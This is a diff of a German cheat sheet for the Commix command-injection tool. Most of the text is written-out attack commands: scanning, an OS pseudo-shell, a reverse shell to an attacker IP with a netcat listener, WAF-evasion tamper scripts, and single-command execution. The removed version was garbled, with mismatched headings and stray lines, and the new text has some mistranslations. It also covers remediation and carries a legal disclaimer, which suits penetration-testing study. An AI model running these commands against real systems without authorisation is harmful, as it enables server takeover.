@@ -1,12 +1,16 @@
-# 💉 Commix – vollständiger Spickzettel
-
 <!-- language-home-navigation -->
 [🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)
+
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 💉 Commix – Vollständiger Cheatsheet
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
    ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
   ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
@@ -16,7 +20,6 @@
    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
        [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
   <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
@@ -25,41 +28,40 @@
 </p>
 
 <p align="center">
-  <b>🌐 Automated tool designed to detect and exploit Command Injection vulnerabilities in web applications and spawn interactive shells</b>
+  <b>🌐 Automatisiertes Tool zum Erkennen und Ausnutzen von Command-Injection-Schwachstellen in Webanwendungen und zum Erzeugen interaktiver Shells</b>
 </p>
 
 ---
 
 ## 📋 Inhaltsverzeichnis
 
-- [Einführung](#-overview--the-command-injection-primitive)
-- [Installation](#-installation)
-- [Basic Vulnerability Scanning](#-basic-vulnerability-scanning)
-- [Injecting Different HTTP Elements](#-injecting-different-http-elements)
-  - [Optionen und Parameter](#get-parameters)
-  - [🔍 Injecting Different HTTP Elements](#post-data---data)
-  - [Use the `INJECT_HERE` tag if multiple parameters exist:](#http-headers--cookies)
+- [Übersicht und das Command-Injection-Primitiv](#-overview--the-command-injection-primitive)
+- [Installation](#-Installation)
+- [Grundlegendes Schwachstellenscannen](#-basic-vulnerability-scanning)
+- [Injizieren verschiedener HTTP-Elemente](#-injecting-different-http-elements)
+  - [GET-Parameter](#get-parameters)
+  - [POST-Daten (`--data`)](#post-data---data)
+  - [HTTP-Header und Cookies](#http-headers--cookies)
 - [Spawning Interactive & Reverse Shells](#-spawning-interactive--reverse-shells)
   - [Pseudo-Shell (`--os-shell`)](#pseudo-shell---os-shell)
-  - [Pseudo-Shell (`--os-shell`)](#native-reverse-shell---reverse-ip)
-- [WAF Evasion & Tamper Scripts (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
-- [File-Based & Time-Based Blind Techniques](#-file-based--time-based-blind-techniques)
-- [Kurzreferenz](#-quick-reference-table)
-- [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
-- [Legal Disclaimer](#-legal-disclaimer)
+  - [Native Reverse Shell (`--reverse-ip`)](#native-reverse-shell---reverse-ip)
+- [WAF-Umgehungs- und Manipulationsskripte (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
+- [Dateibasierte und zeitbasierte Blindtechniken](#-file-based--time-based-blind-techniques)
+- [Kurzreferenztabelle](#-quick-reference-table)
+- [Verteidigungsüberlegungen und Abhilfemaßnahmen](#-defensive-überlegungen--remediation)
+- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)
 
 ---
 
-## 🎯 Einführung
+## 🎯 Übersicht und das Command-Injection-Primitiv
 
-While **SQLMap** automates SQL injection, **Commix** (created by **Anastasios Stasinopoulos**) is the gold standard for finding and exploiting **OS Command Injection** flaws.
+Während **SQLMap** die SQL-Injection automatisiert, ist **Commix** (erstellt von **Anastasios Stasinopoulos**) der Goldstandard zum Auffinden und Ausnutzen von **OS Command Injection**-Schwachstellen.
 
-When web applications unsafely pass user inputs directly to operating system execution functions (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), attackers can append arbitrary shell commands. Commix detects results-based, output-based, time-based blind, and file-based injection vectors automatically.
+Wenn Webanwendungen Benutzereingaben unsicher direkt an die Ausführungsfunktionen des Betriebssystems (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`) weiterleiten, können Angreifer beliebige Shell-Befehle anhängen. Commix erkennt automatisch ergebnisbasierte, ausgabebasierte, zeitbasierte blinde und dateibasierte Injektionsvektoren.
 
 ---
 
 ## 📥 Installation
-
 ```bash
 # Debian / Ubuntu / Kali Linux
 sudo apt update && sudo apt install -y commix
@@ -69,11 +71,9 @@ git clone https://github.com/commixproject/commix.git
 cd commix
 python3 commix.py --help
 ```
-
 ---
 
-## 🚀 Basic Vulnerability Scanning
-
+## 🚀 Grundlegendes Schwachstellenscannen
 ```bash
 # Scan a URL with GET parameters
 commix -u "http://target.local/status.php?addr=127.0.0.1"
@@ -81,18 +81,16 @@ commix -u "http://target.local/status.php?addr=127.0.0.1"
 # Automatically answer Yes to all interactive prompts (Batch mode)
 commix -u "http://target.local/ping.php?host=localhost" --batch
 ```
-
 ---
 
-## 🔍 Injecting Different HTTP Elements
+## 🔍Injizieren verschiedener HTTP-Elemente
 
-### Optionen und Parameter
-Use the `INJECT_HERE` tag if multiple parameters exist:
+### GET-Parameter
+Verwenden Sie das Tag `INJECT_HERE`, wenn mehrere Parameter vorhanden sind:
 ```bash
 commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
 ```
-
-### 🔍 Injecting Different HTTP Elements
+### POST-Daten (`--data`)
 ```bash
 # Test POST body parameters
 commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"
@@ -100,8 +98,7 @@ commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping
 # Replay an HTTP request captured directly in Burp Suite
 commix -r request.req
 ```
-
-### Use the `INJECT_HERE` tag if multiple parameters exist:
+### HTTP-Header und Cookies
 ```bash
 # Test User-Agent header for command injection
 commix -u "http://target.local/index.php" --user-agent="test" --level=3
@@ -109,23 +106,19 @@ commix -u "http://target.local/index.php" --user-agent="test" --level=3
 # Inject through authenticated session cookies
 commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
 ```
-
 ---
 
-## 💀 Spawning Interactive & Reverse Shells
+## 💀 Interaktive und umgekehrte Shells erzeugen
 
 ### Pseudo-Shell (`--os-shell`)
 
-When injection is confirmed, Commix provides an emulated pseudo-terminal directly within the console:
-
+Wenn die Injektion bestätigt wird, stellt Commix ein emuliertes Pseudo-Terminal direkt in der Konsole bereit:
 ```bash
 commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
 ```
+### Native Reverse Shell (`--reverse-ip`)
 
-### Pseudo-Shell (`--os-shell`)
-
-When injection is confirmed, Commix provides an emulated pseudo-terminal directly within the console:
-
+Weisen Sie Commix an, eine vollständig interaktive Reverse-TCP-Verbindung zurück zu Ihrem Netcat-Listener zu trennen:
 ```bash
 # 1. Start a Netcat listener on your machine
 nc -lvnp 4444
@@ -134,13 +127,11 @@ nc -lvnp 4444
 commix -u "http://target.local/ping.php?ip=127.0.0.1" \
   --reverse-ip=10.10.14.5 --reverse-port=4444
 ```
-
 ---
 
-## 🥷 WAF Evasion & Tamper Scripts (`--tamper`)
+## 🥷 WAF-Umgehungs- und Manipulationsskripte (`--tamper`)
 
-Bypass Web Application Firewalls (WAF) and string blacklists using built-in obfuscation tampering:
-
+Umgehen Sie Web Application Firewalls (WAF) und String-Blacklists mithilfe der integrierten Verschleierungsmanipulation:
 ```bash
 # List available tamper scripts
 commix --list-tampers
@@ -151,13 +142,11 @@ commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs
 # Hex encode all injection strings
 commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
 ```
-
 ---
 
-## ⏱️ File-Based & Time-Based Blind Techniques
+## ⏱️ Dateibasierte und zeitbasierte Blindtechniken
 
-When output is not rendered back into the HTTP response:
-
+Wenn die Ausgabe nicht zurück in die HTTP-Antwort gerendert wird:
 ```bash
 # Force Time-Based Blind evaluation
 commix -u "http://target.local/blind.php?id=1" --technique=T
@@ -165,33 +154,32 @@ commix -u "http://target.local/blind.php?id=1" --technique=T
 # Force File-Based injection (writes command output to web root /tmp/)
 commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
 ```
-
 ---
 
-## ⚡ Kurzreferenz
+## ⚡ Kurzreferenztabelle
 
-|Objective|Befehl|
+| Ziel | Befehl |
 |-----------|---------|
-|**Scan GET Parameter**|`commix -u "<URL>?param=val"`|
-|**Scan POST Parameter**|`commix -u "<URL>" --data="param=val"`|
-|**Batch Non-Interactive Scan**|`commix -u "<URL>" --batch`|
-|**Interactive Terminal Shell**|`commix -u "<URL>" --os-shell`|
-|**Drop Reverse Shell**|`commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>`|
-|**Replay Burp Request**|`commix -r burp_request.req`|
-|**Use Space Tamper**|`commix -u "<URL>" --tamper=space2ifs`|
-|**Execute Single Command**|`commix -u "<URL>" --os-cmd="whoami; id"`|
+| **GET-Parameter scannen** | `commix -u "<URL>?param=val"` |
+| **POST-Parameter scannen** | `commix -u "<URL>" --data="param=val"` |
+| **Batch-nicht-interaktiver Scan** | `commix -u "<URL>" --batch` |
+| **Interaktive Terminal-Shell**| `commix -u "<URL>" --os-shell` |
+| **Reverse Shell fallen lassen** | `commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>` |
+| **Rülpsanforderung erneut abspielen** | `commix -r burp_request.req` |
+| **Space Tamper verwenden** | `commix -u "<URL>" --tamper=space2ifs` |
+| **Einzelnen Befehl ausführen** | `commix -u "<URL>" --os-cmd="whoami; id"` |
 
 ---
 
-## 🛡️ Defensive Considerations & Remediation
+## 🛡️ Defensive Überlegungen und Abhilfemaßnahmen
 
-|**Execute Single Command**|`commix -u "<URL>" --os-cmd="whoami; id"`|
-2. **Use Native Language APIs:** Replace system utilities with native programming language libraries (e.g., use Python's `socket` library rather than executing the system `ping` binary).
-3. **Strict Whitelisting:** If user input must dictate program execution, validate input against a strict alphanumeric whitelist before invocation.
+1. **Vermeiden Sie die Ausführung der Betriebssystem-Shell:** Verketten Sie niemals unbereinigte Benutzereingaben mit `system()`, `exec()` oder Shell-Befehlen.
+2. **Native Language APIs verwenden:** Ersetzen Sie Systemdienstprogramme durch native Programmiersprachenbibliotheken (verwenden Sie z. B. die `socket`-Bibliothek von Python, anstatt die System-`ping`-Binärdatei auszuführen).
+3. **Strenges Whitelisting:** Wenn Benutzereingaben die Programmausführung vorschreiben müssen, validieren Sie die Eingaben vor dem Aufruf anhand einer strengen alphanumerischen Whitelist.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Rechtlicher Haftungsausschluss
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> Commix automates arbitrary command execution on target servers. Fuzzing or exploiting unauthorized web applications is illegal. Use only on systems where you possess explicit written authorization.
+> [!ACHTUNG]
+> Commix automatisiert die Ausführung beliebiger Befehle auf Zielservern. Das Fuzzen oder Ausnutzen nicht autorisierter Webanwendungen ist illegal. Verwenden Sie es nur auf Systemen, für die Sie eine ausdrückliche schriftliche Genehmigung besitzen.
